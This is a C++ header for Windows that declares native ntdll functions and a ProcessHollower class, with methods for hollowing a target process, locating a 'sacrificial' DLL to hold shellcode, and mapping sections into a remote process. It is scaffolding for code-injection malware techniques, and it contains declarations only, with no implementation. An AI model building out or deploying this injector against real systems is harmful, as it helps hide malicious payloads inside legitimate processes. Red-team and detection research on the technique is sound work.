#pragma once
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <string>
#include <iostream>

using namespace std;

#pragma comment(lib,"ntdll.lib")

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;


EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
NTSYSAPI NTSTATUS NTAPI NtMapViewOfSection(
    IN HANDLE               SectionHandle,
    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress OPTIONAL,
    IN ULONG                ZeroBits OPTIONAL,
    IN ULONG                CommitSize,
    IN OUT PLARGE_INTEGER   SectionOffset OPTIONAL,
    IN OUT PULONG           ViewSize,
    IN SIZE_T                InheritDisposition,
    IN ULONG                AllocationType OPTIONAL,
    IN ULONG                Protect);

NTSYSAPI NTSTATUS NTAPI NtCreateSection(
    OUT PHANDLE             SectionHandle,
    IN ULONG                DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER       MaximumSize OPTIONAL,
    IN ULONG                PageAttributess,
    IN ULONG                SectionAttributes,
    IN HANDLE               FileHandle OPTIONAL);

class ProcessHollower
{
public:
    static int HollowProcess(string targetExePath, string srcExePath);
    static BOOL isDllLoaded(HANDLE hProcess, wchar_t* filePath);
    static BOOL findSacrificialDll(HANDLE hProcess, wchar_t* FilePath, size_t size_FilePath, size_t size_of_shellcode);
    static PVOID MapDllImage(HANDLE hSection, HANDLE hProcess, DWORD protect);
    static BOOL CreateSection(LPWSTR dllPath, HANDLE hProcess);
};

